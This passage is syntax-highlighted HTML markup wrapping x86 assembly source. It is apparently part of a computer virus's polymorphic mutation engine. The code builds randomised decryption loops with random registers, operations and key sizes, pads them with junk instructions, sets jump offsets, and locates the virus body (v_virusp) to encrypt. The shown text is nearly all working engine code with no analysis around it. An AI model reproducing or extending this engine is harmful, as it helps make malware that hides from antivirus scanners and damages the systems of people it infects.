</span><span class="sc5">normal_counter</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">t_chgpnt</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">r_pointer</span><span class="sc4">)],</span><span class="sc2">05h</span><span class="sc0">
                                        </span><span class="sc1">; no bp + off</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">reget_size_op</span><span class="sc0">

        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">                   </span><span class="sc1">; select if use only pointer or</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">reget_size_op</span><span class="sc0">           </span><span class="sc1">; pointer + offset</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_random</span><span class="sc0">              </span><span class="sc1">; select random offset</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">t_chgpnt</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">t_pntoff</span><span class="sc4">)],</span><span class="sc8">eax</span><span class="sc0">
                                        </span><span class="sc1">; if using get offset</span><span class="sc0">
</span><span class="sc5">reget_size_op</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_random</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0fh</span><span class="sc0">                 </span><span class="sc1">; select math operation and size</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">                 </span><span class="sc1">; of operand</span><span class="sc0">
        </span><span class="sc6">jz</span><span class="sc0">      </span><span class="sc5">reget_size_op</span><span class="sc0">

</span><span class="sc1">;      byte  word  dword</span><span class="sc0">
</span><span class="sc1">; ror   1     6     b</span><span class="sc0">
</span><span class="sc1">; sub   2     7     c</span><span class="sc0">
</span><span class="sc1">; xor   3     8     d</span><span class="sc0">
</span><span class="sc1">; add   4     9     e</span><span class="sc0">
</span><span class="sc1">; rol   5     a     f</span><span class="sc0">
</span><span class="sc1">;</span><span class="sc0">
</span><span class="sc5">no_rorrrpr</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">t_chgpnt</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">r_regkey</span><span class="sc4">)],</span><span class="sc2">03</span><span class="sc0">
                                        </span><span class="sc1">; if not ax,cx,dx,bx then can't be byte</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">can_use_all</span><span class="sc0">             </span><span class="sc1">; as key</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">6</span><span class="sc0">                    </span><span class="sc1">; is byte? get another</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">reget_size_op</span><span class="sc0">

</span><span class="sc5">can_use_all</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">cl</span><span class="sc4">,</span><span class="sc2">9</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">t_chgpnt</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">r_regkey</span><span class="sc4">)],</span><span class="sc2">20h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">no_keychanges</span><span class="sc0">

        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">8</span><span class="sc0">                   </span><span class="sc1">; edx has rnd</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">011b</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">t_chgpnt</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">t_chgkey</span><span class="sc4">)],</span><span class="sc8">dl</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">

</span><span class="sc5">no_keychanges</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">0bh</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">ok_counts</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">4d</span><span class="sc0">                  </span><span class="sc1">; if with words 4 inc/dec less</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">0202h</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">06d</span><span class="sc0">
        </span><span class="sc6">jae</span><span class="sc0">     </span><span class="sc5">ok_counts</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">                     </span><span class="sc1">; for bytes even less</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">],</span><span class="sc2">0101h</span><span class="sc0">

</span><span class="sc5">ok_counts</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_garbage</span><span class="sc0">
</span><span class="sc5">get_nextseq</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_random</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">011b</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">edx</span><span class="sc4">],</span><span class="sc2">0</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">get_nextseq</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                   </span><span class="sc1">; offset = * 4</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">t_chgpnt</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">o_table</span><span class="sc4">)</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">+</span><span class="sc8">edx</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ebp</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc8">ecx</span><span class="sc0">                     </span><span class="sc1">; call the routine to do it</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">loop</span><span class="sc0">    </span><span class="sc5">ok_counts</span><span class="sc0">

</span><span class="sc1">; finished decryption loop, needs comparation and jumps</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_garbage</span><span class="sc0">

        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">t_chgpnt</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">t_cntoff</span><span class="sc4">)]</span><span class="sc0">
        </span><span class="sc6">or</span><span class="sc0">      </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">jnz</span><span class="sc0">     </span><span class="sc5">must_compare</span><span class="sc0">

</span><span class="sc5">get_checker</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_random</span><span class="sc0">
        </span><span class="sc6">and</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">0fh</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">09d</span><span class="sc0">
        </span><span class="sc6">ja</span><span class="sc0">      </span><span class="sc5">get_checker</span><span class="sc0">
</span><span class="sc5">must_compare</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">eax</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">chk_counter</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">   </span><span class="sc1">; get comparer</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">t_chgpnt</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">r_counter</span><span class="sc4">)]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">81h</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">store_d00</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">xor</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">al</span><span class="sc0">
        </span><span class="sc6">stosb</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">make_jumps</span><span class="sc0">
</span><span class="sc5">store_d00</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">t_chgpnt</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">t_countback</span><span class="sc4">)],</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">not_negcnt1</span><span class="sc0">
        </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
</span><span class="sc5">not_negcnt1</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
</span><span class="sc5">make_jumps</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">get_random</span><span class="sc0">
        </span><span class="sc6">ror</span><span class="sc0">     </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc2">1</span><span class="sc0">
        </span><span class="sc6">jc</span><span class="sc0">      </span><span class="sc5">do_withlong</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">make_jmpback</span><span class="sc0">            </span><span class="sc1">; do jump back, in EAX lenght of jump</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc2">7fh</span><span class="sc0">                 </span><span class="sc1">; max short jump offset</span><span class="sc0">
        </span><span class="sc6">jb</span><span class="sc0">      </span><span class="sc5">ok_offsetj</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">ebx</span><span class="sc0">                 </span><span class="sc1">; if &gt; then redo from start</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">dec</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">make_jumps</span><span class="sc0">
</span><span class="sc5">ok_offsetj</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ah</span><span class="sc4">,</span><span class="sc2">74h</span><span class="sc0">                  </span><span class="sc1">; jne + offset</span><span class="sc0">
        </span><span class="sc6">xchg</span><span class="sc0">    </span><span class="sc8">al</span><span class="sc4">,</span><span class="sc8">ah</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">word</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">-</span><span class="sc2">2</span><span class="sc4">],</span><span class="sc8">ax</span><span class="sc0">
        </span><span class="sc6">jmp</span><span class="sc0">     </span><span class="sc5">done_cond</span><span class="sc0">
</span><span class="sc5">do_withlong</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ax</span><span class="sc4">,</span><span class="sc2">840fh</span><span class="sc0">                </span><span class="sc1">; jz long</span><span class="sc0">
        </span><span class="sc6">stosw</span><span class="sc0">
        </span><span class="sc6">stosd</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">make_jmpback</span><span class="sc0">            </span><span class="sc1">; do jump back, in EAX lenght of jump</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">-</span><span class="sc2">4</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">     </span><span class="sc1">; store the lenght</span><span class="sc0">
</span><span class="sc5">done_cond</span><span class="sc4">:</span><span class="sc0">


</span><span class="sc1">; now decryption loop generation is finished</span><span class="sc0">
        </span><span class="sc6">lea</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,[</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">v_lenght</span><span class="sc0"> </span><span class="sc4">+</span><span class="sc0"> </span><span class="sc8">ebp</span><span class="sc4">]</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">v_lenght</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">r_used</span><span class="sc4">)],</span><span class="sc2">10h</span><span class="sc0">
                                        </span><span class="sc1">; can use all regs (except ESP) again</span><span class="sc0">

        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_garbage</span><span class="sc0">             </span><span class="sc1">; unencrypted one, some more here</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_garbage</span><span class="sc0">

        </span><span class="sc6">push</span><span class="sc0">    </span><span class="sc8">edi</span><span class="sc0">
        </span><span class="sc6">call</span><span class="sc0">    </span><span class="sc5">rnd_garbage</span><span class="sc0">                     </span><span class="sc1">; encrypted garbage</span><span class="sc0">
        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">                 </span><span class="sc1">; how much encrypted garbage</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">edx</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">

        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc4">]</span><span class="sc0">

        </span><span class="sc6">shr</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">                   </span><span class="sc1">; so it will be enough for b/w/d enc</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">shl</span><span class="sc0">     </span><span class="sc8">ecx</span><span class="sc4">,</span><span class="sc2">2</span><span class="sc0">

        </span><span class="sc6">pop</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">                         </span><span class="sc1">; lenght of decryptor</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">v_lenght</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">v_runnin</span><span class="sc4">)]</span><span class="sc0">
                                                </span><span class="sc1">; running offset</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">v_lenght</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">w_pointer</span><span class="sc4">)]</span><span class="sc0">
        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">v_lenght</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">t_fromend</span><span class="sc4">)],</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">pushf</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">no_adding</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">                         </span><span class="sc1">; from end</span><span class="sc0">
</span><span class="sc5">no_adding</span><span class="sc4">:</span><span class="sc0">
        </span><span class="sc6">sub</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">v_lenght</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">t_pntoff</span><span class="sc4">)]</span><span class="sc0">
                                                </span><span class="sc1">; - pointer offset if is there</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">+</span><span class="sc2">1</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">           </span><span class="sc1">; set initial pointer</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">v_lenght</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">w_counter</span><span class="sc4">)]</span><span class="sc0">
        </span><span class="sc6">inc</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">v_lenght</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">t_cntoff</span><span class="sc4">)]</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">eax</span><span class="sc4">,</span><span class="sc8">ecx</span><span class="sc0">
        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">],</span><span class="sc8">eax</span><span class="sc0">

        </span><span class="sc6">cmp</span><span class="sc0">     </span><span class="sc10">byte</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">v_lenght</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">t_countback</span><span class="sc4">)],</span><span class="sc2">00h</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">not_negcnt</span><span class="sc0">
        </span><span class="sc6">neg</span><span class="sc0">     </span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">ebx</span><span class="sc4">]</span><span class="sc0">

</span><span class="sc5">not_negcnt</span><span class="sc4">:</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">esi</span><span class="sc4">,</span><span class="sc10">dword</span><span class="sc0"> </span><span class="sc9">ptr</span><span class="sc0"> </span><span class="sc4">[</span><span class="sc8">esi</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc4">(</span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">v_lenght</span><span class="sc0"> </span><span class="sc4">-</span><span class="sc0"> </span><span class="sc9">offset</span><span class="sc0"> </span><span class="sc5">v_virusp</span><span class="sc4">)]</span><span class="sc0">

        </span><span class="sc6">mov</span><span class="sc0">     </span><span class="sc8">ebx</span><span class="sc4">,</span><span class="sc8">edi</span><span class="sc0">                 </span><span class="sc1">; pointer on code to encrypt</span><span class="sc0">
        </span><span class="sc6">add</span><span class="sc0">     </span><span class="sc8">edi</span><span class="sc4">,</span><span class="sc8">edx</span><span class="sc0">                 </span><span class="sc1">; + encrypted garbage</span><span class="sc0">
        </span><span class="sc6">popf</span><span class="sc0">
        </span><span class="sc6">je</span><span class="sc0">      </span><span class="sc5">no_adding2</span><span class="sc0">
